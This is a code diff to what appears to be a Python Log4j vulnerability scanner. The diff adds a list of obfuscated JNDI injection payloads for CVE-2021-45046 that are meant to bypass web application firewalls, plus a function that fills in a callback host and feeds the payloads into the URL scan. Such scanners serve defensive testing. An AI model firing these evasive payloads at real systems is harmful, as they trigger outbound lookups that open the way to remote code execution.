@@ -68,6 +68,17 @@ cve_2021_45046 = [
                   "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
                  ]  
 
+waf_bypass_payloads_2021_45046 = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1#{{callback_host}}/{{random}}}",
+                       "${${::-j}ndi:rmi://127.0.0.1#{{callback_host}}/{{random}}}",
+                       "${jndi:rmi://127.0.0.1#{{callback_host}}/{{random}}}",
+                       "${${lower:jndi}:${lower:rmi}://127.0.0.1#{{callback_host}}/{{random}}}",
+                       "${${lower:${lower:jndi}}:${lower:rmi}://127.0.0.1#{{callback_host}}/{{random}}}",
+                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://127.0.0.1#{{callback_host}}/{{random}}}",
+                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://127.0.0.1#{{callback_host}}/{{random}}}",
+                       "${jndi:dns://127.0.0.1#{{callback_host}}/{{random}}}",
+                       "${jnd${123%25ff:-${123%25ff:-i:}}ldap://127.0.0.1#{{callback_host}}/{{random}}}"
+                       ]
+
 cve_2021_45105 = [
                 "$${ctx:loginId}"
 ]
@@ -170,6 +181,16 @@ def generate_waf_bypass_payloads(callback_host, random_string):
     payloads = []
     count = 0
     for i in waf_bypass_payloads:
+        count = count + 1
+        new_payload = i.replace("{{callback_host}}", callback_host)
+        new_payload = new_payload.replace("{{random}}", f'{random_string}_{count}')
+        payloads.append(new_payload)
+    return payloads
+
+def generate_waf_bypass_payloads_2021_45046(callback_host, random_string):
+    payloads = []
+    count = 0
+    for i in waf_bypass_payloads_2021_45046:
         count = count + 1
         new_payload = i.replace("{{callback_host}}", callback_host)
         new_payload = new_payload.replace("{{random}}", f'{random_string}_{count}')
@@ -307,9 +328,8 @@ def scan_url(url, callback_host):
     if args.cve_2021_45046:
         cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
         payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
-    if args.cve_2021_45105:
-        cprint(f"[•] Scanning for CVE-2021-45105 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
-        payloads = get_cve_2021_45105_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
+        if args.waf_bypass_payloads:
+            payloads.extend(generate_waf_bypass_payloads_2021_45046(f'{parsed_url["host"]}.{callback_host}', random_string))
 
 
     for payload in payloads:
